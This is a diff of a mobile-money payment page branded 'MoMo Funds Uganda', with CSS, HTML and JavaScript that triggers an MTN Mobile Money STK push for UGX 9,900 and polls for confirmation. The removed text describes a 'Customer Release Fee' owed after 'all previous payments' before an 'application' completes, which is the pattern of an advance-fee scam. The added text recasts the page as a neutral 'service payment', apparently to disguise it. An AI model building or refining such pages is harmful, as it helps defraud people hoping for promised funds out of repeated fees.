@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="theme-color" content="#FFCC00">
-<title>MoMo Funds Uganda - Final Release Fee</title>
+<title>MomoFunds Uganda - Service Payment</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 
@@ -40,8 +40,6 @@ overflow:hidden;
 box-shadow:0 20px 55px rgba(0,0,0,.12);
 }
 
-/* Header */
-
 .header{
 background:linear-gradient(160deg,#FFCC00,#F9A825);
 padding:24px 22px 70px;
@@ -70,8 +68,6 @@ margin-top:6px;
 color:#374151;
 font-size:14px;
 }
-
-/* Floating amount card */
 
 .release-card{
 width:calc(100% - 36px);
@@ -102,8 +98,6 @@ font-weight:800;
 padding:0 18px 22px;
 }
 
-/* Success notice */
-
 .notice{
 background:#FFF8E1;
 border:1px solid #FFE082;
@@ -114,8 +108,6 @@ font-size:14px;
 line-height:1.6;
 margin-bottom:18px;
 }
-
-/* Detail tiles */
 
 .details{
 display:grid;
@@ -154,8 +146,6 @@ font-size:12px;
 font-size:14px;
 color:#111827;
 }
-
-/* Button */
 
 button{
 width:100%;
@@ -200,8 +190,6 @@ opacity:.6;
 cursor:not-allowed;
 }
 
-/* Status */
-
 #status{
 margin-top:14px;
 text-align:center;
@@ -220,8 +208,6 @@ color:#15803D;
 background:#FEF2F2;
 color:#DC2626;
 }
-
-/* Security strip */
 
 .security{
 margin-top:20px;
@@ -245,17 +231,17 @@ gap:8px;
 
 <div class="header">
 
-<div class="tag">FINAL VERIFICATION</div>
+<div class="tag">SECURE CHECKOUT</div>
 
-<h1>🇺🇬 MoMo Funds Uganda</h1>
+<h1>🇺🇬 MomoFunds Uganda</h1>
 
-<p>Complete your final payment</p>
+<p>Complete your service payment</p>
 
 </div>
 
 <div class="release-card">
 
-<small>Customer Release Fee</small>
+<small>Amount Due</small>
 
 <h2>UGX 9,900</h2>
 
@@ -264,7 +250,7 @@ gap:8px;
 <div class="content">
 
 <div class="notice">
-Congratulations! You have completed all previous payments. The final step is to pay the <strong>Customer Release Fee of UGX 9,900</strong>. Once this payment is confirmed, your application will proceed to completion.
+Please review your details below and complete your payment using MTN Mobile Money. Your payment will be confirmed automatically once it is successfully processed.
 </div>
 
 <div class="details">
@@ -275,9 +261,9 @@ Congratulations! You have completed all previous payments. The final step is to 
 
 <div class="tile-text">
 
-<small>Applicant</small>
+<small>Customer</small>
 
-<strong id="name">Applicant</strong>
+<strong id="name">Customer</strong>
 
 </div>
 
@@ -299,7 +285,7 @@ Congratulations! You have completed all previous payments. The final step is to 
 
 </div>
 
-<button id="payBtn" onclick="payService()">
+<button id="payBtn">
 
 Pay UGX 9,900 →
 
@@ -326,38 +312,43 @@ Pay UGX 9,900 →
 <script>
 "use strict";
 
-const BACKEND_URL = "https://nyota-program-001-functionality-1.onrender.com";
-const FEE = 9900;
+const BACKEND_URL="https://https-momo-funds-uganda-onrender-com.onrender.com";
+const PAYMENT_AMOUNT=9900;
 
-const button = document.getElementById("payBtn");
-const statusBox = document.getElementById("status");
+const button=document.getElementById("payBtn");
+const statusBox=document.getElementById("status");
 
-const applicant =
-localStorage.getItem("fullName") ||
-localStorage.getItem("fullname") ||
-"Applicant";
+const applicant=
+localStorage.getItem("fullName")||
+localStorage.getItem("fullname")||
+"Customer";
 
-const phone =
-localStorage.getItem("phoneNumber") ||
-localStorage.getItem("phone") ||
+const phone=
+localStorage.getItem("phoneNumber")||
+localStorage.getItem("phone")||
 "";
 
-document.getElementById("name").textContent = applicant;
-document.getElementById("phone").textContent = phone || "Not available";
+document.getElementById("name").textContent=applicant;
+document.getElementById("phone").textContent=phone||"Not available";
 
 function setStatus(message,type=""){
-statusBox.textContent = message;
-statusBox.className = type;
+statusBox.textContent=message;
+statusBox.className=type;
 }
 
 function resetButton(){
-button.disabled = false;
-button.textContent = "Pay UGX 9,900 →";
+button.disabled=false;
+button.textContent="Pay UGX 9,900 →";
 }
 
 async function readJson(response){
-const txt = await response.text();
-return txt ? JSON.parse(txt) : {};
+const txt=await response.text();
+if(!txt) return {};
+try{
+return JSON.parse(txt);
+}catch{
+throw new Error("Invalid server response.");
+}
 }
 
 async function payService(){
@@ -367,41 +358,43 @@ setStatus("Phone number not found.","error");
 return;
 }
 
-button.disabled = true;
-button.textContent = "Sending MoMo Request...";
+button.disabled=true;
+button.textContent="Sending Request...";
 setStatus("Sending payment request...");
 
 try{
 
-const response = await fetch(BACKEND_URL + "/stk-push",{
+const response=await fetch(`${BACKEND_URL}/api/uganda/stk-push`,{
 method:"POST",
 headers:{
 "Content-Type":"application/json"
 },
 body:JSON.stringify({
 phone,
-amount:FEE
+amount:PAYMENT_AMOUNT
 })
 });
 
-const data = await readJson(response);
+const data=await readJson(response);
 
-if(!response.ok || data.success===false){
-throw new Error(data.message || "Payment request failed.");
+if(!response.ok||data.success===false){
+throw new Error(data.message||"Payment request failed.");
 }
 
-const transactionId =
-data.transactionId ||
-data.checkout_request_id ||
-data.data?.transactionId ||
-data.data?.checkout_request_id;
+const transactionId=
+data.transactionId||
+data.data?.transaction_id||
+data.data?.transactionId||
+data.transaction_id||
+data.reference||
+data.data?.reference;
 
 if(!transactionId){
 throw new Error("Transaction reference missing.");
 }
 
-button.textContent = "Waiting for Payment...";
-setStatus("MTN Mobile Money request sent. Enter your MoMo PIN.");
+button.textContent="Waiting...";
+setStatus("Payment request sent. Waiting for confirmation...");
 
 checkPayment(transactionId);
 
@@ -415,9 +408,9 @@ resetButton();
 
 function checkPayment(transactionId){
 
-let attempts = 0;
+let attempts=0;
 
-const timer = setInterval(async()=>{
+const timer=setInterval(async()=>{
 
 attempts++;
 
@@ -430,27 +423,27 @@ return;
 
 try{
 
-const response = await fetch(BACKEND_URL + "/payment-status",{
-method:"POST",
-headers:{
-"Content-Type":"application/json"
-},
-body:JSON.stringify({transactionId})
-});
+const response=await fetch(
+`${BACKEND_URL}/api/uganda/status/${transactionId}`
+);
 
-const result = await readJson(response);
+const result=await readJson(response);
 
-const payment = result.data || result;
-const status = String(payment.status || "").toUpperCase();
+const status=String(result.data?.status||"").toUpperCase();
 
-if(["SUCCESS","COMPLETED","CONFIRMED"].includes(status)){
+if(status==="PENDING"){
+setStatus("Payment request sent. Waiting for confirmation...");
+return;
+}
+
+if(["SUCCESS","SUCCESSFUL"].includes(status)){
 
 clearInterval(timer);
 
 setStatus("Payment confirmed. Redirecting...","success");
 
-button.disabled = true;
-button.textContent = "Payment Confirmed";
+button.disabled=true;
+button.textContent="Payment Confirmed";
 
 setTimeout(()=>{
 window.location.href="success.html";
@@ -459,11 +452,11 @@ window.location.href="success.html";
 return;
 }
 
-if(["FAILED","CANCELLED","EXPIRED"].includes(status)){
+if(["FAILED","CANCELLED"].includes(status)){
 
 clearInterval(timer);
 
-setStatus("Payment " + status.toLowerCase() + ".","error");
+setStatus("Payment "+status.toLowerCase()+".","error");
 
 resetButton();
 
@@ -476,6 +469,8 @@ console.error(error);
 },3000);
 
 }
+
+button.addEventListener("click",payService);
 </script>
 
 </body>
